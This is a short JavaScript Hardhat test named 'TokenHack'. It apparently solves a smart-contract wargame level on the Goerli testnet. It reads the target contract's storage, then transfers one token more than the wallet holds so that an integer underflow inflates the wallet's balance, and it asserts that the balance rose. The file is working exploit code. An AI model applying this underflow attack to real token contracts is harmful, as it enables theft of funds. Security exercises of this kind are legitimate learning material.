const { expect } = require("chai");
const { ethers } = require("hardhat");
const { api_key, } = require('../secrets.json');

describe("TokenHack", function () {
    
    beforeEach(async function () {
    });
    
    it("Attack", async function () {
        const target_address = "0x8E785cEfcA6bC6AB13c2b8cAF39483Ccd8916a67";
        const wallet_address = "0x4eFE395F3A03E3c6117A65E119291FFF2B79E033";    
        const provider = new ethers.providers.AlchemyProvider(network="goerli", api_key);

        var data;
        console.log("Logging stored memory on the contract");
        for (let i = 0; i < 2; i++) {
            data = await provider.getStorageAt(target_address, i);
            console.log(i, data);
        }

        let contract = await ethers.getContractAt("Token", target_address);
        let balance = +(await contract.balanceOf(wallet_address));
        console.log("Current token balance of owned wallet: ", balance);
        console.log("Attack: Transferring %s Tokens from %s to %s", balance+1, wallet_address, target_address);
        let transferTx = await contract.transfer(target_address, balance+1); 
        await transferTx.wait(2);
        let new_balance = +(await contract.balanceOf(wallet_address)); 
        console.log("Updated token balance of owned wallet: ", new_balance);
        expect(new_balance).to.be.greaterThan(balance);
  });

  afterEach(async function() {
  });

});
